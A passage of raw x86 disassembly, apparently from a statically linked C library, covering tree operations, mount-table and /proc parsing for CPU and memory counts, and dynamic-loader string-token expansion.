add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
test edx, edx
je 0x807a308
mov eax, dword [edx]
test eax, eax
je 0x807a306
mov ebx, eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_4h], eax
call esi
mov ecx, eax
mov eax, ebx
test ecx, ecx
je 0x807a308
lea eax, [ebx + 4]
lea edx, [ebx + 8]
test ecx, ecx
cmovns eax, edx
mov eax, dword [eax]
test eax, eax
mov ebx, eax
jne 0x807a2e0
xor eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
push ebp
xor edx, edx
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xdc
mov dword [ebp - 0x20], 0
mov dword [ebp - 0x1c], 0x28
mov ebx, dword [ebp + 0xc]
lea eax, [esp + 8]
mov dword [ebp - 0x24], eax
test ebx, ebx
je 0x807a393
mov esi, dword [ebx]
test esi, esi
je 0x807a393
mov eax, esi
mov dword [ebp - 0x30], 0x5f
lea esi, [esi]
mov eax, dword [eax]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call dword [ebp + 0x10]
test eax, eax
mov edx, eax
je 0x807a3ce
mov ecx, dword [ebp - 0x1c]
cmp dword [ebp - 0x20], ecx
je 0x807a39d
mov ecx, dword [ebp - 0x20]
mov esi, dword [ebx]
mov edi, dword [ebp - 0x24]
add dword [ebp - 0x30], 4
lea eax, [esi + 8]
mov dword [edi + ecx*4], ebx
lea ebx, [esi + 4]
inc ecx
test edx, edx
mov dword [ebp - 0x20], ecx
cmovns ebx, eax
xor edx, edx
mov eax, dword [ebx]
test eax, eax
jne 0x807a350
lea esp, [ebp - 0xc]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebp - 0x30]
mov edi, dword [ebp - 0x20]
mov ecx, dword [ebp - 0x20]
mov esi, dword [ebp - 0x24]
cld
and eax, 0xfffffff0
add edi, 0x14
sub esp, eax
shl ecx, 2
mov dword [ebp - 0x1c], edi
lea eax, [esp + 8]
shr ecx, 2
mov dword [ebp - 0x34], eax
mov edi, eax
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [ebp - 0x34]
mov dword [ebp - 0x24], eax
jmp 0x807a36d
mov edx, dword [ebx]
mov dword [ebp - 0x10], esi
mov ecx, edx
mov dword [ebp - 0x14], edx
mov edx, dword [edx + 8]
mov esi, dword [ecx + 4]
test esi, esi
je 0x807a6ce
test edx, edx
je 0x807a6ce
mov eax, dword [ebp - 0x14]
mov ecx, dword [ebp - 0x20]
mov edx, ebx
add eax, 8
lea ecx, [ecx*4 + 0x5f]
mov dword [ebp - 0x28], eax
mov dword [ebp - 0x2c], ecx
mov edi, dword [ebp - 0x1c]
cmp dword [ebp - 0x20], edi
je 0x807a699
mov ecx, dword [ebp - 0x20]
mov edi, dword [ebp - 0x24]
add dword [ebp - 0x2c], 4
mov dword [edi + ecx*4], edx
mov edx, dword [ebp - 0x28]
inc ecx
mov dword [ebp - 0x20], ecx
mov eax, dword [edx]
mov ecx, dword [eax + 4]
test ecx, ecx
je 0x807a437
add eax, 4
mov dword [ebp - 0x28], eax
jmp 0x807a406
mov dword [ebp - 0x18], eax
mov eax, dword [ebp - 0x18]
mov edx, dword [eax + 4]
test edx, edx
je 0x807a691
mov edi, dword [ebp - 0x20]
test edi, edi
jne 0x807a66d
mov dword [ebx], edx
mov eax, dword [ebp - 0x14]
cmp dword [ebp - 0x18], eax
je 0x807a467
mov ecx, dword [ebp - 0x18]
mov ebx, dword [ebp - 0x14]
mov eax, dword [ecx]
mov dword [ebx], eax
mov edi, dword [ebp - 0x18]
test byte [edi + 0xc], 1
jne 0x807a52a
mov esi, dword [ebp - 0x20]
test esi, esi
jle 0x807a522
test edx, edx
je 0x807a490
test byte [edx + 0xc], 1
jne 0x807a522
lea esi, [esi]
mov eax, dword [ebp - 0x20]
mov ecx, dword [ebp - 0x24]
mov edi, dword [ecx + eax*4 - 4]
mov esi, dword [edi]
mov eax, dword [esi + 4]
cmp edx, eax
je 0x807a5ad
test eax, eax
mov ecx, eax
je 0x807a4dd
movzx eax, byte [eax + 0xc]
test al, 1
je 0x807a4dd
and eax, 0xfffffffe
mov byte [ecx + 0xc], al
or byte [esi + 0xc], 1
mov eax, dword [ecx + 8]
mov edx, dword [ebp - 0x20]
mov dword [ecx + 8], esi
mov dword [esi + 4], eax
mov dword [edi], ecx
lea edi, [ecx + 8]
mov ecx, dword [ebp - 0x24]
mov dword [ecx + edx*4], edi
mov ecx, dword [esi + 4]
inc edx
mov dword [ebp - 0x20], edx
mov ebx, dword [ecx + 8]
test ebx, ebx
je 0x807a4ee
test byte [ebx + 0xc], 1
jne 0x807a5a8
mov eax, dword [ecx + 4]
test eax, eax
je 0x807a500
test byte [eax + 0xc], 1
jne 0x807a53d
nop
lea esi, [esi]
or byte [ecx + 0xc], 1
mov edx, esi
dec dword [ebp - 0x20]
mov ebx, dword [ebp - 0x20]
test ebx, ebx
jle 0x807a522
test edx, edx
je 0x807a490
test byte [edx + 0xc], 1
je 0x807a490
test edx, edx
je 0x807a52a
and byte [edx + 0xc], 0xfe
mov ebx, dword [ebp - 0x18]
mov dword [esp], ebx
call fcn.08051180
mov edx, dword [ebp - 0x10]
jmp 0x807a393
test eax, eax
je 0x807a547
test byte [eax + 0xc], 1
jne 0x807a57d
movzx edx, byte [esi + 0xc]
movzx eax, byte [ebx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ebx + 0xc], al
mov eax, dword [ebx + 8]
mov dword [esi + 4], eax
mov eax, dword [ebx + 4]
mov dword [ebx + 4], ecx
mov dword [ecx + 8], eax
mov dword [ebx + 8], esi
mov dword [edi], ebx
and byte [esi + 0xc], 0xfe
mov dword [ebp - 0x20], 1
xor edx, edx
jmp 0x807a506
movzx edx, byte [esi + 0xc]
movzx eax, byte [ecx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ecx + 0xc], al
and byte [esi + 0xc], 0xfe
mov eax, dword [ecx + 4]
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 8]
mov dword [ecx + 8], esi
mov dword [esi + 4], eax
mov dword [edi], ecx
jmp 0x807a572
mov eax, dword [ecx + 4]
jmp 0x807a53d
mov ecx, dword [esi + 8]
test ecx, ecx
je 0x807a5e4
movzx eax, byte [ecx + 0xc]
test al, 1
je 0x807a5e4
and eax, 0xfffffffe
mov byte [ecx + 0xc], al
or byte [esi + 0xc], 1
mov eax, dword [ecx + 4]
mov ebx, dword [ebp - 0x20]
mov dword [ecx + 4], esi
mov dword [esi + 8], eax
mov eax, dword [ebp - 0x24]
mov dword [edi], ecx
lea edi, [ecx + 4]
mov ecx, dword [esi + 8]
mov dword [eax + ebx*4], edi
inc ebx
mov dword [ebp - 0x20], ebx
mov eax, dword [ecx + 4]
test eax, eax
mov ebx, eax
je 0x807a5f3
test byte [eax + 0xc], 1
jne 0x807a668
mov eax, dword [ecx + 8]
test eax, eax
je 0x807a500
test byte [eax + 0xc], 1
je 0x807a500
test eax, eax
je 0x807a612
test byte [eax + 0xc], 1
jne 0x807a63c
movzx edx, byte [esi + 0xc]
movzx eax, byte [ebx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ebx + 0xc], al
mov eax, dword [ebx + 4]
mov dword [esi + 8], eax
mov eax, dword [ebx + 8]
mov dword [ebx + 8], ecx
mov dword [ecx + 4], eax
mov dword [ebx + 4], esi
jmp 0x807a56c
movzx edx, byte [esi + 0xc]
movzx eax, byte [ecx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ecx + 0xc], al
and byte [esi + 0xc], 0xfe
mov eax, dword [ecx + 8]
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 4]
mov dword [ecx + 4], esi
mov dword [esi + 8], eax
jmp 0x807a5a4
mov eax, dword [ecx + 8]
jmp 0x807a608
mov ecx, dword [ebp - 0x20]
mov ebx, dword [ebp - 0x24]
mov edi, dword [ebp - 0x18]
mov eax, dword [ebx + ecx*4 - 4]
mov ecx, dword [eax]
cmp edi, dword [ecx + 8]
je 0x807a689
mov dword [ecx + 4], edx
jmp 0x807a455
mov dword [ecx + 8], edx
jmp 0x807a455
mov edx, dword [eax + 8]
jmp 0x807a448
mov eax, dword [ebp - 0x20]
mov esi, dword [ebp - 0x24]
cld
add eax, 0x14
mov dword [ebp - 0x1c], eax
mov eax, dword [ebp - 0x2c]
and eax, 0xfffffff0
sub esp, eax
lea ecx, [esp + 8]
mov dword [ebp - 0x34], ecx
mov edi, dword [ebp - 0x34]
mov ecx, dword [ebp - 0x20]
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [ebp - 0x34]
mov dword [ebp - 0x24], eax
jmp 0x807a412
mov edi, dword [ebp - 0x14]
mov dword [ebp - 0x18], edi
jmp 0x807a43a
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, eax
mov esi, ecx
mov edi, edx
mov eax, dword [eax + 4]
test eax, eax
jne 0x807a703
mov eax, dword [ebx + 8]
test eax, eax
je 0x807a767
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 0
mov dword [esp], ebx
call edi
mov eax, dword [ebx + 4]
test eax, eax
jne 0x807a75b
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call edi
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a74f
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 2
mov dword [esp], ebx
call edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea ecx, [esi + 1]
mov edx, edi
call 0x807a6e0
jmp 0x807a733
lea ecx, [esi + 1]
mov edx, edi
call 0x807a6e0
jmp 0x807a71b
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], 3
jmp 0x807a73f
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a799
test edx, edx
je 0x807a799
xor ecx, ecx
leave
jmp 0x807a6e0
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, eax
mov eax, dword [eax + 4]
mov esi, edx
test eax, eax
jne 0x807a7de
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a7d5
mov eax, dword [ebx]
mov dword [esp], eax
call esi
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov edx, esi
call fcn.0807a7a0
jmp 0x807a7be
call fcn.0807a7a0
jmp 0x807a7b7
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a800
leave
jmp fcn.0807a7a0
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov dword [var_38h], 0
mov dword [var_34h], edx
mov dword [var_30h], eax
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_mtab
call fcn.08090280
test eax, eax
mov ebx, eax
je 0x807a90c
mov dword [var_4h], 2
mov dword [esp], ebx
call fcn.08076c00
mov eax, dword [var_34h]
mov dword [esp], ebx
mov dword [var_ch], eax
mov eax, dword [var_30h]
mov dword [var_8h], eax
lea eax, [var_2ch]
mov dword [var_4h], eax
call fcn.080903d0
test eax, eax
je 0x807a8bd
mov esi, dword [var_24h]
mov edi, str.proc
mov ecx, 5
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a884
mov eax, dword [var_28h]
mov dword [var_38h], eax
mov dword [esp], ebx
call fcn.08090300
mov eax, dword [var_38h]
test eax, eax
je 0x807a905
mov eax, dword [var_38h]
mov dword [esp], eax
call fcn.08076e80
mov edx, eax
mov eax, dword [var_38h]
test edx, edx
je 0x807a8f3
xor eax, eax
lock cmpxchg dword [0x80aad98], edx
test eax, eax
jne 0x807a8fb
mov eax, dword [0x80aad98]
add esp, 0x3c
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], edx
call fcn.08051180
jmp 0x807a8ee
mov eax, str._proc
jmp 0x807a8f3
mov dword [var_4h], 0x80a4e5b
mov dword [esp], str._etc_fstab
call fcn.08090280
test eax, eax
mov ebx, eax
jne 0x807a874
jmp 0x807a905
lea esi, [esi]
push ebp
mov edx, 0x2000
mov ebp, esp
push edi
push esi
lea eax, [ebp - 0x200c]
push ebx
sub esp, 0x2010
mov dword [ebp - 0x2010], 1
call fcn.0807a840
test eax, eax
mov esi, eax
je 0x807aa26
mov dword [esp], eax
call fcn.08053400
add eax, 0x1b
and eax, 0xfffffffc
sub esp, eax
lea edi, [arg_1bh]
mov dword [var_4h], esi
and edi, 0xfffffff0
mov dword [esp], edi
call fcn.080773c0
mov dword [eax], 0x6174732f
mov word [eax + 4], 0x74
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa34
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov edi, 0x80a35a1
mov ecx, 3
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
jne 0x807a9c3
movsx eax, byte [ebp - 0x2009]
mov edx, dword [ebp - 0x2010]
sub eax, 0x30
cmp eax, 9
setbe al
inc edx
test al, 1
cmove edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807a9c3
mov dword [esp], ebx
call fcn.08049dc0
mov eax, dword [ebp - 0x2010]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.080773c0
mov dword [esp], eax
mov dword [var_8h], 9
mov dword [var_4h], str._cpuinfo
call fcn.08053740
mov dword [esp], edi
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807aa26
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
lea eax, [ebp - 0x200c]
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], eax
call fcn.08076c40
test eax, eax
je 0x807aa1e
mov ecx, 9
mov edi, str.processor
lea esi, [ebp - 0x200c]
cld
repe cmpsb byte [esi], byte ptr es:[edi]
mov edx, dword [ebp - 0x2010]
seta cl
setb al
inc edx
cmp cl, al
cmovne edx, dword [ebp - 0x2010]
mov dword [ebp - 0x2010], edx
jmp 0x807aa88
nop
lea esi, [esi]
push ebp
mov edx, 0x2000
mov ebp, esp
push edi
push esi
lea edi, [ebp - 0x200c]
push ebx
sub esp, 0x2014
mov dword [ebp - 0x2010], 0xffffffff
mov dword [ebp - 0x2014], eax
mov eax, edi
call fcn.0807a840
test eax, eax
mov esi, eax
je 0x807abed
mov dword [esp], eax
call fcn.08053400
add eax, 0x1b
and eax, 0xfffffffc
sub esp, eax
lea ebx, [arg_1bh]
mov dword [var_4h], esi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.080773c0
mov dword [var_4h], str._meminfo
mov dword [var_8h], 9
mov dword [esp], eax
call fcn.08053740
mov dword [esp], ebx
mov dword [var_4h], 0x8093820
call fcn.0804a250
test eax, eax
mov ebx, eax
je 0x807abed
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov dword [ebp - 0x2010], 0
mov dword [var_8h], ebx
mov dword [var_4h], 0x2000
mov dword [esp], edi
call fcn.08076c40
test eax, eax
je 0x807abe5
lea eax, [ebp - 0x2010]
mov dword [esp], edi
mov dword [var_8h], eax
mov eax, dword [ebp - 0x2014]
mov dword [var_4h], eax
call fcn.08049be0
dec eax
jne 0x807ab87
call fcn.080546b0
mov esi, dword [ebp - 0x2010]
cmp eax, 0xffffffff
lea edx, [eax + 0x3ff]
mov ecx, eax
cmovle ecx, edx
mov eax, esi
sar ecx, 0xa
cdq
idiv ecx
mov dword [ebp - 0x2010], eax
mov dword [esp], ebx
call fcn.08049dc0
mov ebx, dword [ebp - 0x2010]
cmp ebx, 0xffffffff
je 0x807ac02
lea esp, [var_ch]
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
call fcn.08048b20
mov dword [eax], 0x26
jmp 0x807abf8
nop
push ebp
mov eax, str.MemTotal:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
mov esi, esi
push ebp
mov eax, str.MemFree:__ld_kB
mov ebp, esp
leave
jmp 0x807aae0
nop
nop
mov eax, dword [0x80aac44]
push ebp
mov edx, 0x64
mov ebp, esp
leave
test eax, eax
cmove eax, edx
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 8
test eax, eax
mov edi, dword [arg_8h]
je 0x807ad3b
mov dword [esp], 3
call section.
mov eax, dword [eax]
xor esi, esi
mov ebx, dword [eax + 0x50]
cmp byte [ebx], 0
je 0x807ad32
mov dword [var_4h], ebx
mov dword [esp], edi
call fcn.08076e50
test eax, eax
je 0x807ad36
mov dword [esp], ebx
mov dword [var_4h], 0
inc esi
call fcn.080537a0
cmp byte [eax + 1], 0
lea ebx, [eax + 1]
jne 0x807acb5
xor eax, eax
test al, al
je 0x807ad32
mov eax, 0
test eax, eax
je 0x807ad2b
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov ebx, dword [eax + 0x6c]
mov eax, 0
add ebx, esi
test eax, eax
je 0x807ad24
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + ebx*4 + 0x24]
add esp, 8
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x807ad16
mov eax, dword [0x80a9ab4]
jmp 0x807acfa
xor eax, eax
jmp 0x807ad1c
movzx eax, byte [ebx]
jmp 0x807ace1
mov eax, dword [0x80a9ab4]
jmp 0x807aca5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov edx, dword [arg_ch]
mov dword [esp], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
test edx, edx
mov eax, ebx
je 0x807ada2
mov ecx, dword [edx]
shr eax, cl
cmp eax, dword [edx + 4]
jae 0x807ada0
mov esi, dword [edx + eax*4 + 0x14]
test esi, esi
je 0x807ada0
mov ecx, dword [edx + 8]
mov eax, ebx
shr eax, cl
and eax, dword [edx + 0xc]
lea eax, [edx + eax*4]
mov ecx, dword [esi + eax]
test ecx, ecx
je 0x807ada0
mov eax, ebx
and eax, dword [edx + 0x10]
lea eax, [edx + eax*4]
add ebx, dword [ecx + eax]
lea esi, [esi]
mov eax, ebx
mov ebx, dword [esp]
mov esi, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
mov eax, dword [0x80aa844]
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
test eax, eax
jne 0x807add1
cmp ebx, 0x10000
setbe al
mov ebx, dword [esp]
leave
movzx eax, al
ret
call section.
cmp ebx, dword [eax + 0x41c]
jmp 0x807adc6
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
mov ecx, dword [arg_ch]
push esi
mov esi, dword [arg_10h]
push ebx
movzx eax, byte [ecx]
cmp al, 0x7b
je 0x807aea0
xor ebx, ebx
cmp al, byte [esi]
je 0x807ae88
movzx edx, byte [ecx]
mov eax, edi
test al, al
je 0x807ae71
xor eax, eax
cmp dl, 0x7d
je 0x807ae34
pop ebx
pop esi
pop edi
leave
ret
dec ecx
add ebx, 2
mov esi, dword [arg_18h]
test esi, esi
jne 0x807ae43
mov eax, ebx
jmp 0x807ae2f
movzx eax, byte [ebx + ecx]
test al, al
je 0x807ae5a
mov edx, dword [arg_14h]
test edx, edx
je 0x807ae56
cmp al, 0x3a
je 0x807ae5a
xor eax, eax
jmp 0x807ae2f
mov eax, dword [arg_8h]
inc eax
cmp ecx, eax
je 0x807ae3f
mov eax, dword [arg_14h]
test eax, eax
je 0x807ae56
cmp byte [ecx - 2], 0x3a
jne 0x807ae56
jmp 0x807ae3f
test dl, dl
je 0x807ae38
cmp dl, 0x2f
je 0x807ae38
mov edi, dword [arg_14h]
test edi, edi
je 0x807ae56
cmp dl, 0x3a
jne 0x807ae56
jmp 0x807ae38
test al, al
je 0x807ae1f
lea esi, [esi]
inc ebx
movzx edx, byte [ebx + ecx]
cmp dl, byte [ebx + esi]
jne 0x807ae22
test dl, dl
jne 0x807ae90
jmp 0x807ae22
inc ecx
mov edi, 1
movzx eax, byte [ecx]
jmp 0x807ae19
mov esi, esi
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x14
mov ebx, dword [arg_8h]
mov esi, ebx
mov eax, dword [0x80a95f4]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807af0d
inc edi
lea eax, [eax + ebx]
mov dword [var_4h], 0x24
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
mov ebx, eax
jne 0x807aec0
add esp, 0x14
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
jne 0x807aee9
mov eax, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [esp], esi
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
je 0x807aeea
jmp 0x807aee9
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov esi, dword [arg_10h]
mov ebx, dword [arg_ch]
mov dword [var_14h], esi
mov dword [var_10h], ebx
movzx eax, byte [ebx]
cmp al, 0x24
je 0x807afac
mov byte [esi], al
inc ebx
mov eax, dword [arg_14h]
inc esi
test eax, eax
je 0x807afa7
movzx eax, byte [ebx]
cmp al, 0x3a
je 0x807afa2
mov esi, esi
test al, al
jne 0x807af78
mov byte [esi], 0
mov eax, dword [arg_10h]
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_14h], esi
jmp 0x807af90
movzx eax, byte [ebx]
jmp 0x807af90
mov eax, dword [0x80a95f4]
mov edx, dword [var_10h]
inc ebx
mov dword [var_8h], str.ORIGIN
mov dword [var_4h], ebx
mov dword [var_sp_10h], eax
mov dword [esp], edx
mov eax, dword [arg_14h]
mov dword [var_ch], eax
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b049
mov edx, dword [arg_8h]
mov eax, dword [edx + 0x190]
test eax, eax
je 0x807affe
cmp eax, 0xffffffff
je 0x807affe
mov dword [esp], esi
mov dword [var_4h], eax
add ebx, edi
call fcn.080773c0
mov esi, eax
jmp 0x807afa7
cmp edi, 1
jbe 0x807b040
add ebx, edi
mov esi, dword [var_14h]
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov ecx, dword [arg_14h]
test ecx, ecx
jne 0x807b032
inc ebx
movzx eax, byte [ebx]
test al, al
je 0x807af94
mov edx, dword [arg_14h]
test edx, edx
je 0x807b016
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
cmp al, 0x3a
jne 0x807b016
jmp 0x807af90
nop
lea esi, [esi]
mov byte [esi], 0x24
inc esi
jmp 0x807afa7
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], str.PLATFORM
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807b07f
mov eax, dword [0x80aac34]
jmp 0x807afe3
mov eax, dword [arg_14h]
mov edx, dword [var_10h]
mov dword [var_sp_10h], 0
mov dword [var_8h], 0x80a362c
mov dword [var_4h], ebx
mov dword [var_ch], eax
mov dword [esp], edx
call fcn.0807ae00
test eax, eax
mov edi, eax
je 0x807affe
mov eax, 0x8093da3
jmp 0x807afe3
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x20
mov dword [var_8h], esi
mov dword [var_4h], 0x24
mov dword [var_ch], ebx
mov esi, dword [arg_ch]
mov dword [var_bp_4h], edi
xor ebx, ebx
mov edi, dword [arg_8h]
mov dword [esp], esi
call fcn.08076ce0
test eax, eax
jne 0x807b1c3
test ebx, ebx
jne 0x807b12b
mov dword [esp], esi
call fcn.08053400
lea ebx, [eax + 1]
mov dword [esp], ebx
call fcn.08050fe0
xor edx, edx
test eax, eax
je 0x807b11e
mov dword [var_sp_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08053770
mov edx, eax
mov eax, edx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_bp_4h]
leave
ret
mov dword [esp], esi
call fcn.08053400
mov dword [var_10h], eax
mov eax, dword [edi + 0x190]
test eax, eax
jne 0x807b1b2
mov eax, dword [edi + 4]
cmp byte [eax], 0
jne 0x807b1da
call fcn.08083280
test eax, eax
mov dword [edi + 0x190], eax
je 0x807b1ae
cmp eax, 0xffffffff
je 0x807b1ae
mov dword [esp], eax
call fcn.08053400
mov edx, eax
mov eax, dword [0x80aac0c]
cmp eax, edx
cmovb eax, edx
mov edx, dword [var_10h]
sub eax, 7
imul ebx, eax
lea eax, [ebx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
mov edx, eax
xor eax, eax
test edx, edx
je 0x807b120
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], edx
mov dword [var_4h], esi
mov dword [esp], edi
call fcn.0807af60
jmp 0x807b120
xor edx, edx
jmp 0x807b16a
xor edx, edx
cmp eax, 0xffffffff
je 0x807b16a
mov dword [esp], eax
call fcn.08053400
jmp 0x807b168
mov dword [var_4h], 1
mov dword [esp], eax
call fcn.0807aeb0
mov ebx, eax
jmp 0x807b0ef
mov dword [var_sp_ch], str.expand_dynamic_string_token
mov dword [var_sp_8h], 0x13d
mov dword [var_4h], str.dl_load.c
mov dword [esp], str._l___l_name_0___0
call fcn.0805efc0
mov esi, esi
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
mov esi, edx
push ebx
sub esp, 0x14
mov ebx, dword [eax + 0x14]
test ebx, ebx
je 0x807b22f
mov eax, dword [ebx]
mov dword [esp], esi
mov dword [var_4h_2], eax
call fcn.08076e50
test eax, eax
je 0x807b27b
mov edi, ebx
mov ebx, dword [ebx + 4]
test ebx, ebx
jne 0x807b214
mov dword [esp], esi
call fcn.08053400
lea edx, [eax + 1]
add eax, 0xd
mov dword [var_10h_2], edx
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807b283
test edi, edi
je 0x807b298
mov edx, dword [var_10h_5]
lea eax, [eax + 0xc]
mov dword [var_4h_2], esi
mov dword [esp], eax
mov dword [var_ch_2], edx
call fcn.08053770
mov dword [ebx + 8], 0
mov dword [ebx + 4], 0
mov dword [ebx], eax
mov dword [edi + 4], ebx
lea esp, [var_ch_4]
pop ebx
pop esi
pop edi
leave
ret
xor ecx, ecx
mov edx, esi
mov eax, 0xc
mov dword [esp], str.cannot_allocate_name_record
call fcn.08081200
mov dword [esp + 0xc], 0x80a3689
mov dword [esp + 8], 0x162
mov dword [var_4h_2], str.dl_load.c
mov dword [esp], str.lastp_____void__0_
call fcn.0805efc0
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x24
mov dword [var_14h], 0
mov eax, dword [var_10h_3]
lea edx, [var_4h_2]
mov dword [esp], edx
mov dword [var_4h_3], eax
call fcn.0808ddc0
test eax, eax
mov ebx, eax
je 0x807b511
mov dword [esp], ebx
call fcn.08053400
mov dword [var_10h_4], 0x80a35fc
test eax, eax
mov dword [var_18h], eax
cmove ebx, dword [var_10h_4]
cmp eax, 1
mov dword [var_10h_4], ebx
jbe 0x807b317
cmp byte [eax + ebx - 1], 0x2f
je 0x807b4f2
mov eax, dword [var_18h]
test eax, eax
je 0x807b333
mov eax, dword [var_10h_5]
mov edx, dword [var_18h_2]
cmp byte [edx + eax - 1], 0x2f
je 0x807b333
mov byte [edx + eax], 0x2f
inc edx
mov dword [var_18h_2], edx
mov eax, dword [var_10h_2]
